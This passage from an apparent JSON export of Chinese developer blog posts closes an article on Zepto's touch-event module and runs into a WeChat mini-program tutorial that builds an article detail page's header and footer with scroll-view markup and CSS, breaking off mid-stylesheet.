\u003ccode\u003ecancelAll\u003c/code\u003e 方法，取消所有事件的触发。\u003c/p\u003e\n\u003ch3 id=\"scroll\"\u003escroll\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e$(\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e).on(\u003cspan class=\"hljs-string\"\u003e'scroll'\u003c/span\u003e, cancelAll)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e从前面的分析可以看到，所有的事件触发都是异步的。\u003c/p\u003e\n\u003cp\u003e因为在 \u003ccode\u003escroll\u003c/code\u003e 的时候，肯定是只想响应滚动的事件，异步触发是为了在 \u003ccode\u003escroll\u003c/code\u003e 的过程中和外界调用 \u003ccode\u003ecancelTouch\u003c/code\u003e 方法时， 可以将事件取消。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e系列文章\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8B%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84.md\" target=\"_blank\"\u003e读Zepto源码之代码结构\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8B%E5%86%85%E9%83%A8%E6%96%B9%E6%B3%95.md\" target=\"_blank\"\u003e读Zepto源码之内部方法\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8B%E5%B7%A5%E5%85%B7%E5%87%BD%E6%95%B0.md\" target=\"_blank\"\u003e读Zepto源码之工具函数\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8B%E7%A5%9E%E5%A5%87%E7%9A%84%24.md\" target=\"_blank\"\u003e读Zepto源码之神奇的$\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8B%E9%9B%86%E5%90%88%E6%93%8D%E4%BD%9C.md\" target=\"_blank\"\u003e读Zepto源码之集合操作\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8B%E9%9B%86%E5%90%88%E5%85%83%E7%B4%A0%E6%9F%A5%E6%89%BE.md\" target=\"_blank\"\u003e读Zepto源码之集合元素查找\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8B%E6%93%8D%E4%BD%9CDOM.md\" target=\"_blank\"\u003e读Zepto源码之操作DOM\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8B%E6%A0%B7%E5%BC%8F%E6%93%8D%E4%BD%9C.md\" target=\"_blank\"\u003e读Zepto源码之样式操作\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8B%E5%B1%9E%E6%80%A7%E6%93%8D%E4%BD%9C.md\" target=\"_blank\"\u003e读Zepto源码之属性操作\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8BEvent%E6%A8%A1%E5%9D%97.md\" target=\"_blank\"\u003e读Zepto源码之Event模块\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8BIE%E6%A8%A1%E5%9D%97.md\" target=\"_blank\"\u003e读Zepto源码之IE模块\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8BCallbacks%E6%A8%A1%E5%9D%97.md\" target=\"_blank\"\u003e读Zepto源码之Callbacks模块\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8BDeferred%E6%A8%A1%E5%9D%97.md\" target=\"_blank\"\u003e读Zepto源码之Deferred模块\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8BAjax%E6%A8%A1%E5%9D%97.md\" target=\"_blank\"\u003e读Zepto源码之Ajax模块\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8Bassets%E6%A8%A1%E5%9D%97.md\" target=\"_blank\"\u003e读Zepto源码之Assets模块\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yeyuqiudeng/reading-zepto/blob/master/src/%E8%AF%BBZepto%E6%BA%90%E7%A0%81%E4%B9%8BSelector%E6%A8%A1%E5%9D%97.md\" target=\"_blank\"\u003e读Zepto源码之Selector模块\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"-\"\u003e参考\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://segmentfault.com/a/1190000005882908\" target=\"_blank\"\u003ezepto touch 库源码分析\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developer.mozilla.org/en-US/docs/Web/API/PointerEvent\" target=\"_blank\"\u003ePointerEvent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developer.mozilla.org/en-US/docs/Web/API/Pointer_events\" target=\"_blank\"\u003ePointer events\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developer.mozilla.org/en-US/docs/Web/API/TouchEvent\" target=\"_blank\"\u003eTouchEvent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developer.mozilla.org/en-US/docs/Web/API/Touch\" target=\"_blank\"\u003eTouch\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developer.mozilla.org/en-US/docs/Web/API/GestureEvent\" target=\"_blank\"\u003eGestureEvent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developer.mozilla.org/en-US/docs/Web/API/MSGestureEvent\" target=\"_blank\"\u003eMSGestureEvent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://zrysmt.github.io/2017/04/28/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5DIY%20zepto%E5%BA%93%EF%BC%8C%E7%A0%94%E7%A9%B6zepto%E6%BA%90%E7%A0%818--touch%E6%A8%A1%E5%9D%97/\" target=\"_blank\"\u003e一步一步DIY zepto库，研究zepto源码8--touch模块\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.bbsmax.com/A/Vx5M9nPv5N/\" target=\"_blank\"\u003ezepto源码学习-06 touch\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://blog.h5min.cn/u013055396/article/details/76606048\" target=\"_blank\"\u003ezepto源码之touch.js\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://msdn.microsoft.com/en-us/library/hh968251(v=vs.85\" target=\"_blank\"\u003eaddPointer method\u003c/a\u003e.aspx)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"license\"\u003eLicense\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"http://creativecommons.org/licenses/by-nc-nd/4.0/\" target=\"_blank\"\u003e署名-非商业性使用-禁止演绎 4.0 国际 (CC BY-NC-ND 4.0)\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e最后，所有文章都会同步发送到微信公众号上，欢迎关注,欢迎提意见：  \u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/5/30/76626b0be42083d36b36f4a117dc1873\" alt=\"\"/\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e \u003c/p\u003e\n\u003cp\u003e作者：对角另一面\u003c/p\u003e\n","buildTime":"1515052291.3716","__v":0}
{"_id":{"$oid":"5a4e188de4919b0e782b4c80"},"id":"59f7f255f265da43215356de","author":{"$oid":"5a4cc1f937991328ecbc7447"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"微信小程序教学第四章第一节（含视频）：小程序中级实战教程：详情-页面制作","meta":{"likeCount":0},"tag":["微信小程序","前端","微信"],"comment":[],"shortContent":"页面结构大体分为三部分，也是最常见的布局方式：头部、中间体、尾部。最顶部的是页面 title，也就是标题，如果是一般的页面，我们只需要在 detail.json 中增加如下配置即可： 这里，我们先制作出：头部和尾部。中间的内容部分，会由 parse.js 解析文章数据生成。 S…","content":"\u003ch2\u003e详情 - 页面制作\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本文配套视频地址：\u003cbr\u003e\u003ca href=\"https://v.qq.com/x/page/o0555o20xjd.html\"\u003ehttps://v.qq.com/x/page/o0555o20xjd.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cblockquote\u003e\n\u003cp\u003e开始前请把 \u003ccode\u003ech4-1\u003c/code\u003e 分支中的 \u003ccode\u003ecode/\u003c/code\u003e 目录导入微信开发工具\u003cbr\u003e这一章节中，主要介绍详情页的页面制作过程  \u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e首先看一下我们最终要展示的页面  \u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/10/31/a1bfa94eee64559adcf4288e73b3f7bc\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e页面结构大体分为三部分，也是最常见的布局方式：头部、中间体、尾部。最顶部的是页面 \u003ccode\u003etitle\u003c/code\u003e，也就是标题，如果是一般的页面，我们只需要在 \u003ccode\u003edetail.json\u003c/code\u003e 中增加如下配置即可：\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cdel\u003e\"navigationBarTitleText\": \"Quora精选：为什么聪明人总能保持冷静\"\u003c/del\u003e\u003c/p\u003e\n\u003cp\u003e但我们制作的详情页面信息是随着文章内容一直变化的，所以需要在代码中单独处理，就不需要在 \u003ccode\u003edetail.json\u003c/code\u003e 中添加\u003cbr\u003e这里，我们先制作出：头部和尾部。中间的内容部分，会由 \u003ccode\u003eparse.js\u003c/code\u003e 解析文章数据生成。\u003cbr\u003e\u003cbr\u003e  \u003c/p\u003e\n\u003cp\u003e开始之前，我们先修改 \u003ccode\u003eapp.wxss\u003c/code\u003e 文件，引入需要用到的公用样式表和第三方样式 \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e@\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"./styles/base.wxss\"\u003c/span\u003e;\n@\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"./lib/wxParse/wxParse.wxss\"\u003c/span\u003e;\n\n\u003cspan class=\"hljs-selector-class\"\u003e.green\u003c/span\u003e{\n    \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#26b961\u003c/span\u003e;\n}\n\u003cspan class=\"hljs-selector-tag\"\u003epage\u003c/span\u003e{\n    \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n    \u003cspan class=\"hljs-attribute\"\u003ebackground-color\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#f8f8f8\u003c/span\u003e;\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\n\u003ch3 id=\"step-1-\"\u003eStep 1. 页面准备\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e由于文章需要上下滚动，我们采用 \u003ccode\u003escroll-view\u003c/code\u003e 组件来包括整个页面内容  \u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- detail.html --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escroll-view\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003escroll-y\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eenable-back-to-top\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"root-wrap\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escroll-view\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003ca href=\"https://mp.weixin.qq.com/debug/wxadoc/dev/component/scroll-view.html\"\u003escroll-view\u003c/a\u003e 组件，相当于我们在常规的 \u003ccode\u003ediv\u003c/code\u003e 标签上增加了滚动功能并进行封装\u003cbr\u003e\u003cbr\u003e  \u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003e然后调整下页面的高度和背景色 \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e\u003cspan class=\"hljs-comment\"\u003e/* detail.css */\u003c/span\u003e\n\u003cspan class=\"hljs-selector-tag\"\u003epage\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fbfbfb\u003c/span\u003e;\n \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-selector-class\"\u003e.root-wrap\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cbr\u003e  \u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"step-2-\"\u003eStep 2. 页面头部制作\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003e头部包含三块内容：大标题、左浮动显示作者、右浮云显示日期，制作如下：  \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- detail.html --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escroll-view\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003escroll-y\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eenable-back-to-top\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"root-wrap\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"wrapper\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n   \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n     \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info-title\"\u003c/span\u003e\u0026gt;\u003c/span\u003eQuora精选：为什么聪明人总能保持冷静\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n     \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info-desc cf\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n       \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etext\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info-desc-author fl\"\u003c/span\u003e\u0026gt;\u003c/span\u003e哈利波特\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etext\u003c/span\u003e\u0026gt;\u003c/span\u003e\n       \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etext\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info-desc-date fr\"\u003c/span\u003e\u0026gt;\u003c/span\u003e2017/06/27\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etext\u003c/span\u003e\u0026gt;\u003c/span\u003e\n     \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n     \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"info-line under-line\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n   \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escroll-view\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e对应样式文件，注意： \u003ccode\u003efl(float:left)\u003c/code\u003e、 \u003ccode\u003efr(float:right)\u003c/code\u003e、 \u003ccode\u003ecf(clear:float)\u003c/code\u003e 三个样式都是在 \u003ccode\u003ebase.wxss\u003c/code\u003e 中设置的全局样式\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e\u003cspan class=\"hljs-comment\"\u003e/* detail.css */\u003c/span\u003e\n\u003cspan class=\"hljs-selector-tag\"\u003epage\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fbfbfb\u003c/span\u003e;\n \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-selector-class\"\u003e.root-wrap\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003epadding-bottom\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003erpx\n}\n\n\u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.top-img\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e470\u003c/span\u003erpx;\n \u003cspan class=\"hljs-attribute\"\u003evertical-align\u003c/span\u003e: top\n}\n\n\u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.info\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003erpx\n}\n\n\u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.info-title\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003erpx \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n \u003cspan class=\"hljs-attribute\"\u003eline-height\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003erpx;\n \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003erpx;\n \u003cspan class=\"hljs-attribute\"\u003efont-weight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e;\n \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#333\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.info-desc\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003erpx;\n \u003cspan class=\"hljs-attribute\"\u003eline-height\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003erpx;\n \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#c1c1c1\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.info-desc-author\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003emax-width\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e65%\u003c/span\u003e;\n \u003cspan class=\"hljs-attribute\"\u003etext-overflow\u003c/span\u003e: ellipsis;\n \u003cspan class=\"hljs-attribute\"\u003ewhite-space\u003c/span\u003e: nowrap;\n \u003cspan class=\"hljs-attribute\"\u003eoverflow\u003c/span\u003e: hidden\n}\n\n\u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.info-line\u003c/span\u003e {\n \u003cspan class=\"hljs-attribute\"\u003emargin-top\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003erpx\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"step-3-\"\u003eStep 3. 页面尾部制作\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e页尾类似于于菜单导航功能，用户可以进入 \u003ccode\u003e下一篇\u003c/code\u003e 或 \u003ccode\u003e返回\u003c/code\u003e 列表，并且当页面滚动时候，固定在底部不动  \u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cbr\u003e  \u003c/p\u003e\n\u003cp\u003e修改页面 \u003ccode\u003edetail.html\u003c/code\u003e   \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e  \u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- 增加以下内容，footbar节点与info节点平级 --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"footbar\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"footbar-back clearBtnDefault\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"icon footbar-back-icon\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"footbar-btn clearBtnDefault\"\u003c/span\u003e\u0026gt;\u003c/span\u003e下一篇\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"footbar-share clearBtnDefault\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"icon footbar-share-icon\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eview\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cbr\u003e  \u003c/p\u003e\n\u003cp\u003e修改样式表  \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e  \u003cspan class=\"hljs-comment\"\u003e/* detail.css 增加以下样式内容 */\u003c/span\u003e\n  \u003cspan class=\"hljs-selector-class\"\u003e.wrapper\u003c/span\u003e \u003cspan class=\"hljs-selector-class\"\u003e.footbar\u003c/span\u003e {\n    \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: fixed;\n    \u003cspan 